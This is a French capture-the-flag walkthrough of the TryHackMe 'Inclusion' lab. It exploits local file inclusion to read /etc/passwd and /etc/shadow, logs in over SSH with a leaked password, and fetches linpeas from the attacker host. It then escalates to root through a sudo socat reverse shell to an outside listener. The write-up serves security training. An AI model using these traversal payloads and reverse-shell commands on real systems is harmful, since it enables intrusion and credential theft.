
# Inclusion
> A beginner level LFI challenge

https://tryhackme.com/room/inclusion

Consiste a exploiter une faiblesse dans le code source d'une application web en détournant les fonctionnalitées d'inclusion de fichiers afin d'afficher les fichiers systèmes par ex.

## Nmap

```sh
# nmap -Pn -sC -sV -vv -oN nmap.txt $IP
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDH1X4Cqbxb5okQZBN3LvsIM8dYZOxeMWlReUkWWp+ICQ+6RjVs+bSbShCPac1Zc+lbnfHte1ZRtMW8a3OodW02+8PXcDbZlmMNMWUQmM76D2NZz28PDC7vouYqSQGt6J6gfsTq2YqCMVPU28uoJ/Qvg5C6hM3oFFDztV2BN7Pj+SgZ8a5htxv5wgn/PtWju2CJCQzPhLUrkAlrSb97/YQcvtjwXUGzKGHo62Cl6GINLm3nAVqJnNpm7aWcKowdfnEsrp+S41W5xV1gl4CyvE9usk5LfQwlPDF50FCgzsidA7mn4NbTukdTsNMAOTe0oAmjXAE0q/KCT076stYjRphX
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPvYRKovqOIYhJN1NV8r3T3YTa4N40XFZaWSQjuYyZIsuL6D8Xn9C4v925gPkS/wZyYBh7CRt6CcSbd2ekPByzo=
|   256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAd782HHJj9kHBKUMOUOgfWVBU9LdeGrlTDQ+Z0hD8yI
80/tcp open  http    syn-ack Werkzeug httpd 0.16.0 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```sh
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Werkzeug httpd 0.16.0 (Python 3.6.9)
```

Un serveur Linux Ubuntu qui expose un serveur web et ssh.

## LFI 

view-source:http://10.10.115.164/article?name=lfiattack

la page `article` utilise la valeur de l'argument `name` pour inclure le contenu du fichier correspondant dans la page.


### Récupération du contenu du fichier `/etc/passwd`

view-source:http://10.10.115.164/article?name=../../../../etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
#falconfeast:rootpassword
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
```

> #falconfeast:rootpassword


### Récupération du contenu du fichier `/etc/shadow`

view-source:http://10.10.115.164/article?name=../../../../etc/shadow

```sh
root:$6$mFbzBSI/$c80cICObesNyF9XxbF6h6p6U2682MfG5gxJ5KtSLrGI8766/etwzBvppTuug6aLoltiSmeqdIaEUg6f/NLYDn0:18283:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
lxd:*:18281:0:99999:7:::
uuidd:*:18281:0:99999:7:::
dnsmasq:*:18281:0:99999:7:::
landscape:*:18281:0:99999:7:::
pollinate:*:18281:0:99999:7:::
falconfeast:$6$dYJsdbeD$rlYGlx24kUUcSHTc0dMutxEesIAUA3d8nQeTt6FblVffELe3FxLE3gOID5nLxpHoycQ9mfSC.TNxLxet9BN5c/:18281:0:99999:7:::
sshd:*:18281:0:99999:7:::
mysql:!:18281:0:99999:7:::
```

> $6 => SH512

### Option 1: on craque le mot de passe

```sh
# sudo john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```su

### Option 2 : on utilise betement le commentaire laissé dans le fichier passwd !

```
#falconfeast:rootpassword
```

## SSH 

### test de connection ssh `falconfeast:rootpassword` : SUCCESS

```sh
# ssh falconfeast@10.10.115.164
The authenticity of host '10.10.115.164 (10.10.115.164)' can't be established.
ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.115.164' (ECDSA) to the list of known hosts.
falconfeast@10.10.115.164's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed May 13 01:17:42 IST 2020

  System load:  0.0               Processes:           86
  Usage of /:   34.8% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.115.164
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

3 packages can be updated.
3 updates are security updates.


Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
```


On a une connection ! flag !

```sh
falconfeast@inclusion:~# cat user.txt 
60989655118397345799
```

> Flag 1: **60989655118397345799**


## Recherche de vecteurs d'élévation de privilège:

```sh
# ps -aux
root       556  0.0  3.2 243012 32324 ?        Ss   01:00   0:00 /usr/bin/python3 /usr/local/bin/flask run --host=0.0.0.0 --port=80
```

### LinPEAS
Upload de linpeas via serveur web local.

wget http://10.9.11.184/linpeas.sh


```sh
[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
**    (root) NOPASSWD: /usr/bin/socat**

[+] Checking Pkexec policy

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:**sudo**;unix-group:admin

-rw-r--r-- 1 falconfeast falconfeast 0 Jan 21 15:53 /home/falconfeast/.sudo_as_admin_successful
```

```sh
# sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat

```
> On peux lancer `/usr/bin/socat` en tant que root !

### GTFOBins
https://gtfobins.github.io/gtfobins/socat/#sudo

```sh
# sudo socat tcp-connect:10.9.11.184:9001 exec:sh,pty,stderr,setsid,sigint,sane
```

```sh
# nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.9.11.184] from (UNKNOWN) [10.10.115.164] 34822
# id
id
uid=0(root) gid=0(root) groups=0(root)
# 
```


### Upgrade shell

```sh
# which python
which python
# which python3
which python3
/usr/bin/python3
```

```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

CTRL+Z

```sh
stty raw -echo
fg
```


### get the Flag

```sh
root@inclusion:/root# cat /root/root.txt
42964104845495153909
```

## Un peu plus loin ... ya rien

```sh
~# cat /etc/systemd/system/web.service 
[Unit]
Description=web application
After=network.target
[Service]
User=root
WorkingDirectory=/opt/webapp
ExecStart=/bin/bash -c "/usr/local/bin/flask run --host=0.0.0.0 --port=80"
Restart=always
[Install]
WantedBy=multi-user.target
```

-----

view-source:http://10.10.115.164/article?name=./article.php

```html
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```


php://filter/convert.base64-encode/resource=article.php


Test#4: view-source:http://10.10.115.164/article?namephp://filter/convert.base64-encode/resource=../../../../etc/passwd



http://10.10.204.6/article?name=../../../root/root.txt





